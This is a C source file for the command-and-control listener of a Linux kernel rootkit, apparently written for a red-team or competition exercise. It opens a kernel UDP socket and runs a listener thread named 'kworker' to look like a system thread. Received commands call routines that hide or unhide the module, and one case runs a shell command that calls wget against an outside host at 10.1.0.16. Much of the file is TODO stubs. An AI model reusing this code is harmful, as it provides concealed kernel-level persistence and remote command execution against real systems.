/*
 * Author: Daniel Liscinsky
 */



#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/errno.h>
#include <linux/types.h>
//#include <linux/slab.h>
#include <linux/time.h>

#include <linux/mutex.h>

//#include <linux/socket.h>
#include <net/sock.h>
#include <net/inet_common.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>

#include "c2_server.h"
#include "kernel_rootkit_actions.h"
#include "debug.h"


static int is_c2_server_running = 0;
static struct task_struct *kthread;
static struct mutex c2_thread_mutex;
static struct socket *c2_socket;

static int sh_proc_running = 0;
//static ?? sh_proc; // Handle to the shell process we forked to run shell commands



/**
 * 
 */
/*int decrypt_verify_c2_msg(...) {

	return 0;
}

/**
 * Close the socket used for C2.
 * c2_socket is now NULL.
 */
int close_c2_socket() {

	if (c2_socket) {
		sock_release(c2_socket);
		c2_socket = NULL;
	}
	
	return 0;
}

void construct_msg_header(struct msghdr * msg, struct sockaddr_in * address){
	msg->msg_name    = address;
	msg->msg_namelen = sizeof(struct sockaddr_in);
	msg->msg_control = NULL;
	msg->msg_controllen = 0;
	msg->msg_flags = 0; // this is set after receiving a message
}

int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsigned char* buf, int buf_len) {
	
	struct msghdr msg;
	struct iovec iov;
	mm_segment_t oldfs;
	int size = 0;
	/*
	if (sock->sk == NULL) return -2;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen  = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = NULL;

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_recvmsg(sock, &msg, msg.msg_flags);
	set_fs(oldfs);

	return size;
	*/
	
	struct kvec vec;
	mm_segment_t oldmm;

	construct_msg_header(&msg, addr);
	vec.iov_base = buf;
	vec.iov_len = buf_len;

	oldmm = get_fs(); 
	set_fs(KERNEL_DS);
	// MSG_DONTWAIT: nonblocking operation: as soon as the packet is read, the call returns
	// MSG_WAITALL: blocks until it does not receive size_buff bytes OR the SO_RCVTIMEO expires.
	size =  kernel_recvmsg(sock, &msg, &vec, 1, buf_len, MSG_WAITALL);
	set_fs(oldmm);

	return size;
}

/**
 * 
 */
int c2_listen(void *data) {

	const int noblock = 0;
	int flags = 0;
	//struct user_msghdr msg;
	struct iovec iov;
	int addr_len;

	uint8_t buf[4096];
	int len = 4096;

	int i;

	iov.iov_base = buf;
	iov.iov_len = len;

	DEBUG_pr_info("[INFO] c2 listen kthread is listening...\n");

	/*
	// Wait
	struct timespec go_time = {.tv_sec = 1525728360, .tv_nsec = 0};
	struct timespec ts;
	getnstimeofday(&ts);
	DEBUG_printk2("[INFO] ts.tv_sec = %ld\n", ts.tv_sec);
	
	while(ts.tv_sec < go_time.tv_sec){
		msleep(1000);
		getnstimeofday(&ts);
	}
	
	DEBUG_pr_info("[INFO] Done wait\n");
	*/





	// Continually listen for connections
	while (!kthread_should_stop()) {
		/*
		char *_argv[] = { "wget", "10.2.0.16:8000/?team=blue", NULL };
		char *_envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin", NULL };
		int _result = call_usermodehelper(_argv[0], _argv, _envp, UMH_NO_WAIT);//UMH_NO_WAIT);

		DEBUG_printk2("call_usermodehelper result = %d\n", _result);

		// Timeout
		struct timespec end, ts;
		getnstimeofday(&end);
		end.tv_sec += 90;
		getnstimeofday(&ts);
		while(ts.tv_sec < end.tv_sec){
			msleep(1000);
			getnstimeofday(&ts);
		}

		DEBUG_pr_info("[INFO] timeout end\n");
		*/

		
		/*
		msg.msg_control = NULL;
		msg.msg_controllen = 0;
		msg.msg_flags = 0;
		msg.msg_name = 0;
		msg.msg_namelen = 0;
		msg.msg_iov = &iov;
		msg.msg_iovlen = 1;
		*/
		
		

		// Block until a message arrives
		struct sockaddr_in addr;
		int size = 0;
		size = ksocket_receive(c2_socket, &addr, buf, len);

		/*
		mm_segment_t oldmm;
		oldmm = get_fs(); 
		set_fs(KERNEL_DS);
		// MSG_DONTWAIT: nonblocking operation: as soon as the packet is read, the call returns
		// MSG_WAITALL: blocks until it does not receive size_buff bytes OR the SO_RCVTIMEO expires.
		int addr_len;
		size =  orig_recvfrom(c2_socket, buf, len, 0, &addr, &addr_len);
		set_fs(oldmm);
		*/
		//int size = udp_recvmsg(c2_socket.sk, &msg, size_t len, noblock, flags, &addr_len);
		//int size = sock_recvmsg(c2_socket.sk, &msg, msg.msg_flags);


		// If timed out blocking (or otherwise received 0)
		if (size <= 0) {
			
			/*
			 * It is important that the blocking recv eventually time out 
			 * so that this thread can reguarly check if kthread_should_stop() 
			 * is set. Otherwise this thread will never terminate and the 
			 * kernel module cannot be unloaded.
			 */
			continue;
		}

		// Try to decrypt message
		//TODO	
			

		DEBUG_printk2("[INFO] recv size = %d\n", size);
		DEBUG_pr_info("[INFO] Message:\n");
		for (i = 0; i < len; i++) {
			DEBUG_printk2("%c", buf[i]);
		}
		DEBUG_pr_info("\n---END---\n");
		
		// Check if we already received this message
		if (0) {											//TODO
			continue;
		}

		// Is the message destined for another host?
		if(0){
			// Forward message to peers
			//TODO

			//int udp_sendmsg(c2_socket.sk, struct msghdr *msg, size_t len);


		}
		// The command is for this host
		else {

			//TODO

			switch (BASH_COMMAND) {

			case HIDE_MODULE:
				hide_module();
				break;

			case UNHIDE_MODULE:
				unhide_module();
				break;
				
			case HIDE_FILE:
				//TODO
				break;

			case UNHIDE_FILE:
				//TODO
				break;

			case DELETE_SELF:
				//TODO
				break;

			case BASH_COMMAND:
				;
				char *path = "/bin/sh";
				mm_segment_t old_fs;
				char *argv[] = { path, "-c", "wget 10.1.0.16:8000/?team=blue", NULL };
				char *envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin", NULL };




				struct sub_processinfo *sub_procinfo;
				/*
				sub_procinfo = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
				if (sub_procinfo == NULL) {
					//return -ENOMEM;
					// This is not fatal
					break;
				}

				//call_usermodehelper_pipe();



				
				set_current_state(TASK_INTERRUPTIBLE);

				int result = call_usermodehelper_exec( sub_procinfo, UMH_WAIT_PROC );
				*/
				int result = call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);//UMH_NO_WAIT);
				
				DEBUG_printk2("call_usermodehelper result = %d\n", result);
				

				// If a shell process is not already running, start one
				if (!sh_proc_running) {
					//TODO


					

					sh_proc_running = 1;
				}

				//TODO
				break;

			default:
				;
			}
		}
	}

	DEBUG_pr_info("[INFO] c2 listen kthread is stopped\n");
	return 0;
}



int start_c2_server() {

	int error;
	mm_segment_t fs;
	struct sockaddr_in sin;
	int flag = 1;
	struct timeval recv_timeout = {0, 100000};


	// Check if c2 server is already running
	if (is_c2_server_running) {
		return 0;
	}
	
	// Initialize the mutex
	mutex_init(&c2_thread_mutex);

	
	/*
	DECLARE_WAIT_QUEUE_HEAD(wq);

	mutex_lock(&c2_thread_mutex);
	{
		current->flags |= PF_NOFREEZE;
		//daemonize(MODULE_NAME);
		allow_signal(SIGKILL | SIGSTOP);
	}
	mutex_unlock(&c2_thread_mutex);
	*/

	error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &c2_socket);
	/*#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
	error = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &c2_socket);
	#else
	error = sock_create_kern(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &c2_socket);
	#endif
	*/

	if(error < 0) {
		DEBUG_pr_info("[ERROR] Failed to create c2 socket\n");
		return -1;				// TODO more error handling
	}
	

	fs = get_fs();
	set_fs(KERNEL_DS);
	kernel_setsockopt(c2_socket, SOL_SOCKET, SO_RCVTIMEO , (char * )&recv_timeout, sizeof(recv_timeout));
	kernel_setsockopt(c2_socket, SOL_SOCKET, SO_REUSEADDR , (char * )&flag, sizeof(int));
	kernel_setsockopt(c2_socket, SOL_SOCKET, SO_REUSEPORT , (char * )&flag, sizeof(int));
	set_fs(fs);

	
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(C2_PORT);

	error = c2_socket->ops->bind(c2_socket, (struct sockaddr*)&sin, sizeof(sin));
	if(error < 0) {
		DEBUG_pr_info("[ERROR] BIND ADDRESS\n");
		return -1;				// TODO more error handling
	}
	/*
	error = c2_socket->ops->listen(c2_socket, 5);
	if(error < 0) {
		DEBUG_pr_info("[ERROR] LISTEN ERROR\n");
		return -1;				// TODO more error handling
	}
	*/


	DEBUG_pr_info("[INFO] Starting c2 listen kthread...\n");

	// Start thread to listen for incoming commands
	kthread = kthread_run(c2_listen, NULL, "kworker");

	// If thread failed to start
	if (IS_ERR(kthread)) {
		
		// Try again
		kthread = kthread_run(c2_listen, NULL, "kworker");
		if (IS_ERR(kthread)) {
			
			// Try a 3rd time
			kthread = kthread_run(c2_listen, NULL, "kworker");
			if (IS_ERR(kthread)) {

				// Close socket before leaving
				if (close_c2_socket() < 0) {
					// Try again to close socket
					if (close_c2_socket() < 0) {
						return -2; // Failure, something really bad is going on
					}
				}

				DEBUG_pr_info("[ERROR] Failed to create c2 listen kthread\n");
				return -1; // Failure, this is bad
			}
		}
	}


	is_c2_server_running = 1;
	return 0;
}

int stop_c2_server() {

	// Do nothing if server is not running
	if (!is_c2_server_running) {
		return 0;
	}

	DEBUG_pr_info("[INFO] Stopping c2 kthread...\n");
	int ret = kthread_stop(kthread);

	// If error stopping thread
	if (ret == -EINTR) {
		DEBUG_pr_info("[ERROR] -EINTR stopping c2 kthread\n");

		//TODO This is bad
	}


	is_c2_server_running = 0;
	return 0;
}


